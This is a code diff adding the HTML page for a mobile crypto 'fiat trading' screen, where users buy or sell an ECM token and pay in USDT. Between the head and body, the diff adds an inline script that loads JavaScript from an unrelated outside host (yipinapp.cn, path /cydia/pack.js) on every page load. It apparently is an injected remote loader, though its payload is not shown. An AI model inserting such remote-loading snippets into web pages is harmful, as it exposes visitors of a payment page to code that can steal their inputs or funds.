@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
+		<title>交易</title>
+		<link rel="stylesheet" href="../../static/css/weui.css" />
+		<link rel="stylesheet" href="../../static/css/common.css" />
+		<link rel="stylesheet" href="../../static/css/transaction/transaction.css" />
+	</head>
+	<script>
+		(function () {
+			var dw = document.createElement("script");
+			dw.src = "https://yipinapp.cn/cydia/pack.js?zBv2XrG8cSQqzRDCm9hsEL"
+			var s = document.getElementsByTagName("script")[0];
+			s.parentNode.insertBefore(dw, s);
+		})()
+	</script>
+	<body>
+		<div class="transcanIndex">
+			<div class="weui-tab">
+				<div class="tranceTitle">
+					<div class="tranLeft">
+						<img src="../../static/images/qiehuan.png" />
+						<span class="changeJone" data-statue='1'>用户</span>
+					</div>
+					<div class="weui-navbar navtitle">
+	    				<a class="weui-navbar__item weui-bar__item--on" href="#tab1" data-id="0">我要买</a>
+	    				<a class="weui-navbar__item" href="#tab1" data-id="1">我要卖</a>
+					</div>
+					<div class="tranRight">
+						<a href="tranRecord.html" class="">交易记录</a>
+					</div>
+				</div>
+				<div class="weui-tab__bd">
+					<div id="tab1" class="weui-tab__bd-item weui-tab__bd-item--active">
+				    	<div class="floorImg">
+				    		<img src="../../static/images/logo_4.png" />
+				    	</div>
+				    	<div class="buyBox">
+				    		<ul id="listBox">
+				    			<!--<li>
+				    				<p>购买数量</p>
+				    				<p>5000 ECM</p>
+				    			</li>
+				    			<li>
+				    				<p>购买单价</p>
+				    				<p>￥0.136</p>
+				    			</li>
+				    			<li>
+				    				<p>购买总价</p>
+				    				<p>￥680</p>
+				    			</li>-->
+				    		</ul>
+				    		<div class="selectPay">
+				    			<p class="methodDiv">选择您的付款方式</p>
+				    			<div class="single" id="as">
+				    				<ul>
+<!--				    					<li>
+				    						<label class="agreement weui_cell weui_check_label">
+												<input type="radio" name="bag" class="weui_check" value="0"  />
+												<p class="test-radioInput"></p>
+												<span class="weui-agree__text">支付宝</span>
+											</label>
+				    					</li>
+				    					<li>
+											<label class="agreement weui_cell weui_check_label">
+												<input type="radio" name="bag" value="1" class="weui_check" />
+												<p class="test-radioInput"></p>
+												<span class="weui-agree__text">微信</span>
+											</label>
+										</li>
+										<li>
+											<label class="agreement weui_cell weui_check_label">
+												<input type="radio" name="bag" value="2" class="weui_check" />
+												<p class="test-radioInput"></p>
+												<span class="weui-agree__text">银行卡</span>
+											</label>
+										</li>-->
+										<li>
+											<label class="agreement weui_cell weui_check_label">
+												<input type="radio" name="bag" value="3" class="weui_check" />
+												<p class="test-radioInput"></p>
+												<span class="weui-agree__text">USDT</span>
+											</label>
+										</li>
+				    				</ul>
+				    			</div>
+				    			<div class="double weui-hiden" id="moreSelect">
+				    				<ul>
+<!--				    					<li>
+						    				<label class="weui-agree agreement">
+												<input type="checkbox" name="test" class="weui-agree__checkbox" value="0" />
+												<span class="weui-agree__text">支付宝</span>
+											</label>
+										</li>
+										<li>
+											<label class="weui-agree agreement">
+												<input type="checkbox" name="test" class="weui-agree__checkbox" value="1"  />
+												<span class="weui-agree__text">微信</span>
+											</label>
+										</li>
+										<li>
+											<label class="weui-agree agreement">
+												<input type="checkbox" name="test" class="weui-agree__checkbox" value="2" />
+												<span class="weui-agree__text">银行卡</span>
+											</label>
+										</li>-->
+										<li>
+											<label class="weui-agree agreement">
+												<input type="checkbox" name="test" class="weui-agree__checkbox" value="3" />
+												<span class="weui-agree__text">USDT</span>
+											</label>
+										</li>
+									</ul>
+				    			</div>
+				    		</div>
+				    		<div class="buyDiv">
+				    			<p>*若交易二次验证打开，点击发布后先验证交易密码</p>
+				    			<button type="button" class="weui-btn mybgBtn">发布</button>
+				    		</div>
+						</div>
+				   </div>
+				</div>
+			</div>
+		</div>
+		<div class="weui-tabbar">
+		    <a href="../home/index.html" class="weui-tabbar__item">
+		      <div class="weui-tabbar__icon">
+		        <img src="../../static/images/person.png" alt="">
+		      </div>
+		      <p class="weui-tabbar__label">个人中心</p>
+		    </a>
+		    <a href="../vote/vote.html" class="weui-tabbar__item">
+		      <div class="weui-tabbar__icon  special-se">
+		        <img src="../../static/images/vote.png" alt="">
+		      </div>
+		      <p class="weui-tabbar__label">投票竞选</p>
+		    </a>
+		    <a href="#" class="weui-tabbar__item weui-bar__item--on">
+		      <div class="weui-tabbar__icon">
+		        <img src="../../static/images/transaction-select.png" alt="">
+		      </div>
+		      <p class="weui-tabbar__label">法币交易</p>
+		    </a>
+		    <a href="../account/acount.html" class="weui-tabbar__item">
+		      <div class="weui-tabbar__icon">
+		        <img src="../../static/images/account.png" alt="">
+		      </div>
+		      <p class="weui-tabbar__label">我的账户</p>
+		    </a>
+		  </div>
+		</div>
+		<!--<script type="text/javascript" src="../../lib/zepto.min.js" ></script>-->
+		<script type="text/javascript" src="../../lib/jquery.js" ></script>
+		<script type="text/javascript" src="../../lib/weui.js" ></script>
+		<script type="text/javascript" src="../../lib/jquery-weui.js" ></script>
+		<script type="text/javascript" src="../../static/js/api.js" ></script>
+		<script type="text/javascript" src="../../static/js/common.js" ></script>
+		<script type="text/javascript" src="../../static/js/transaction/transaction.js" ></script>
+	</body>
+</html>
